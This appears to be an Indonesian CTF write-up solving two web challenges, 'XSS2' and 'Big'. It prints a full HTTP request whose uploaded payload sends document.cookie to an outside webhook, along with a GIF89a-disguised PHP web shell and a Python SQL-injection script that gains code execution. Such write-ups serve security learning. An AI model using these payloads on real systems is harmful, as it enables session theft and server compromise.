# XSS2 - Web

## TL;DR

Pada challenge ini kita perlu melakukan DOM clobbering untuk membypass isAdmin di client side, sehingga nantinya kita dapat meload `content` apapun dari source yang ada di server, setelah itu kita perlu melakukan upload dan membypass image check yang ada di server menggunakan ekstensi GIF89a dan meload file yang kita upload di server tadi, sehingga kita mendapatkan XSS.

## Recon

![](https://i.imgur.com/LpIPhuC.png)

Saat kita masuk ke website, kita akan diberikan `login` tab dan `register` tab. 

![](https://i.imgur.com/SSn9Ddu.png)

Saat kita login bisa dilihat disana bahwa input dari credensial yang kita masukkan tadi ter-reflek ke home page user. Sekarang kita akan mencoba untuk menginject html element ke akun menggunakan `<img src=x onerror=alert() />`.

![](https://i.imgur.com/MgOwwTs.png)

Bisa kalian lihat bahwa server memvalidasi email di server side meskipun kita mencoba membypasnya di client side.

![](https://i.imgur.com/WIyLwjR.png)

Tetapi disini kita bisa membypass validasi tersebut dengan memberikan quote di antara payload kita

Ex: "<img/src='x'/onerror='alert()'>"@gmail.com

![](https://i.imgur.com/erMgS9i.png)

Dan kita bisa membypass validasi tersebut.

![](https://i.imgur.com/Sp5HDAH.png)

Tapi disini ada lagi masalah, dimana input kita di filter, sehingga payload kita tidak muncul di halaman utama user.

Bisa dilihat pada source code client terdapat dompurify.

![](https://i.imgur.com/ymNmPGK.png)

setelah itu kalian dapat melihat beberapa kode js dan file main.js sebagai script src.

![](https://i.imgur.com/2ycYLGD.png)

Kode diatas nampaknya mempunyai email kita, yang sudah dirubah menjadi base64, setelah itu email kita tadi akan masuk ke fungsi dompurfiy yang akan men-sanitize imput berbahaya dari inputan email kita tadi.

Sekarang mari kita review `main.js` yang tadi terdapat di inline script src tadi.

![](https://i.imgur.com/wpixaOu.png)

Yang menarik disini ada pada `if(user.isAdmin)`, dimana setelah itu kita akan melihat kode yang membuat element `script` dan menambahkan `content` sebagai src nya.

## Bypassing isAdmin with DOM Clobbering

Sekarang kita tau bahwa jika kita mendapatkan akun admin maka kita akan bisa me-load js kita dan mendapatkan XSS.

Disini kita bisa menggunakan teknik DOM Clobering untuk menjadi admin.

Jadi teknik ini bisa mengubah HTML element dan dengan cara seperti ini `<a id='test'>` dan kita bisa mengaksesnya dengan `test` atau dengan `window.test`.

Jadi kita bisa membuat variable dengan menggunakan teknik html injection seperti ini:

```html
<a id=user><a id='user' name='isAdmin' href=''>
```

Dan email kita akan menjadi seperti ini.

```html
"<a/id=user><a/id='user'/name='isAdmin'/href=''>"@cid.com
```

![](https://i.imgur.com/61LM1FA.png)

Kita bisa melihat bahwa payload kita berhasil terprint, dan sekarang kita adalah admin.

![](https://i.imgur.com/eHt1v2k.png)

Sekarang kita bisa memberikan `content` url parameter. 

Tetapi di script yang dapat dilihat di `main.js` menambahkan `/xss2/scripts/` di belakang url file.

Di login page terdapat file upload, ini bisa kita gunakan untuk mengupload file kita yang berisi script XSS.

Sekarang kita akan mencoba mengupload file yang berisi payload berikut.

```
alert();
```

Tetapi kita akan mendapatkan error seperti ini.

![](https://i.imgur.com/gmiPZO4.png)

Disini kita bisa membypass WAF ini dengan menambahkan header dari file denga `GIF86` tetapi karena `GIF86` akan dideteksi sebagai variable dan akan menghasilkan error `undefined variable` kita perlu menambahkan DOM clobering lagi seperti ini `"<a/id='GIF89a'>`, ini akan membuat variable GIF86 menjadi ada, dan menghilangkan error tersebut.

Kurang lebih seperti di bawah http request yang saya buat untuk mendapatkan XSS. 

```http
POST /xss2/ HTTP/1.1
Host: 172.174.108.207
Content-Length: 852
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.174.108.207
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvx7RraDqCv5SCGof
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.174.108.207/xss2/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b434ce1020e25c6b6b6d0ff6567a22f5
Connection: close

------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="username"

cid7
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="email"

"<a/id='GIF89a'><a/id=user><a/id='user'/name='isAdmin'/href=''>"@cid.com
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="password"

asd
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="confirm-password"

asd
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="fileToUpload"; filename=".jpg"
Content-Type: image/jpeg

GIF89a
window.location='https://eogki39eznqmcza.m.pipedream.net?c='+document.cookie;
------WebKitFormBoundaryvx7RraDqCv5SCGof
Content-Disposition: form-data; name="register-submit"

Register Now
------WebKitFormBoundaryvx7RraDqCv5SCGof--
```

Setelah kita melakukan request tersebut, dan memberikan url dari akun kita ke admin, kita akan mendapatkan flag di webhook seperti berikut.

![](https://i.imgur.com/He4S8Sw.png)

# Big - Web

## Summary

Challenge in vulnerable dengan serangan PHP file upload yang bisa berdampak pada serangan RCE, tetapi ada beberapa WAF yang perlu kita bypass untuk melakukan upload php. Nantinya kita akan membypass fungsi [realpath](https://www.php.net/manual/en/function.realpath.php) dengan menggunakan `file` protocol.

## How to solve

Pada challenge kita diberikan source code dan juga url web dari challenge tersebut.

Setelah kita login dan menuju ke `/profile.php` kita akan mendapatkan file upload yang nantinya bisa kita manfaatkan untuk mengupload file yang kita perlukan untuk mendapatkan RCE.

![](https://i.imgur.com/LpLDDhT.png)

Tetapi jika kita lihat ke source code di `profile.php` itu, kita akan melihat banyak sekali cek yang membuat tidak memungkinkannya melakukan file upload dengan ekstensi php.

```php 
// Check if image file is a actual image or fake image
if (isset($_POST["submit"])) {
  if (empty($_FILES["fileToUpload"]["name"])) {
    die("<script>alert('There is no files');history.back()</script>");
  }

  $target_dir = "up/";
  $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
  $uploadOk = 1;
  $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
  if ($check !== false) {
    $uploadOk = 1;
  } else {
    echo "File is not an image.";
    $uploadOk = 0;
  }



  // Check file size
  if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
  }

  // Allow certain file formats
  if (
    $imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
    && $imageFileType != "gif"
  ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
  }

  // Check if $uploadOk is set to 0 by an error
  if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
    // if everything is ok, try to upload file
  } else {
    if (!move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], "up/" . $_SESSION['uuid'] . ".jpg")) {

      echo "Sorry, there was an error uploading your file.";
    }
  }
}
```

Meskipun begitu kita bisa memanfaatkan `<p id="notes"><?php include_once($_SESSION['notes_file']);?></p>` yang terdapat di `notes.php`, dengan ini kita bisa meng-include file jpg sekalipun utuk mendapatkan RCE.

Sekarang kita akan upload file shell kita, beri nama dengan ekstensi jpg dan header GIf untuk membypass WAF.

Ex: shell.jpg
```php
GIF89a
<?=system($_GET['a'])?>
```

Jangan lupa juga untuk menyimpan url yang tadi.

Ex: http://localhost/big/up/ef2baba2-a5d5-4669-b22d-cdcf2fd13c8a.jpg

Nah, sekarang kita perlu mencari cara untuk membuat `$_SESSION['notes_file']` mempoint ke file shell.jpg kita.

Sejarang kita akan mengeksploit SQLI pada `req.php` yang terdapat di source code seperti berikut.

```php 
...snip...
        if($reg=$conn->query("insert into users(uuid,name,email,password,notes_file)values('$uuid','$name','$email','$pass','$notes_file')") && file_put_contents($notes_file,base64_encode('first_note')))
        {                                                                                         
            die("<script>alert('Success');history.back()</script>"); 
        }
...snip...
```

Kita bisa mengendalikan parameter `$name`, `$email`, dan juga `$pass` dan `$notes_file`, kita bisa mengubah nilai `$notes_file` menjadi path `shell.jpg` yang kita upload tadi.

Disini kita juga perlu membypass `realpaht` di `notes.php` dengan menggunakan `file://` protocol

ex: file:///var/www/html/big/up/ef2baba2-a5d5-4669-b22d-cdcf2fd13c8a.jpg

```php
if(preg_match('/up/',realpath($_SESSION['notes_file'])) || preg_match('/php:\/\/|sess/',$_SESSION['notes_file']))
```

Setelah itu kita tinggal membuat akun baru dengan SQLI dan menyertakan path dari shell.jpg kita tadi di `notes_file`.

Beriktu script yang saya gunakan untuk membuat akun yang berisi SQLI

```python 
import requests
from hashlib import md5

# URL = "http://20.121.121.120:3000/big/"
URL = "http://localhost/big/"

def req(payload, url=URL):
    res = requests.post(url+"reg.php", data={
        "name": payload,
        "email": "test@aasssddsd.com",
        "pass": "test",
        "re_pass": "test",
        "signup": "Register"
    })
    return res.text

a = f"dormamu','dormamu@dormamu','{md5(b'dormamu@dormamu').hexdigest()}','file:///var/www/html/big/up/ef2baba2-a5d5-4669-b22d-cdcf2fd13c8a.jpg');#"
print(req(a))
```

Kita jalankan dan login menggunakan akun tersebut, maka sekarang kita akan mendapatkan Shell di path `/profile.php`.

![](https://i.imgur.com/Lt1mjsr.png)

# External writeup
---
A brief proof of concept from 0xL4ugh CTF 2023's forensic problems

By: hanasuru [link](https://gist.github.com/hanasuru/25d13a7432c417945ee5330329c8e0f8/raw/ded087cc04c8665bfe02717c7d85768e8e8862fa/0xL4ugh_Forensic_PoC.md)

https://github.com/daffainfo/ctf-writeup/tree/main/0xL4ughCTF%202023
- Web - Bruh
- Web - Bruh 2
- Web - Bypass 403
- Web - bypasser
- Web - XSS 1
- Steganography - Colorful
- Osint - El bes

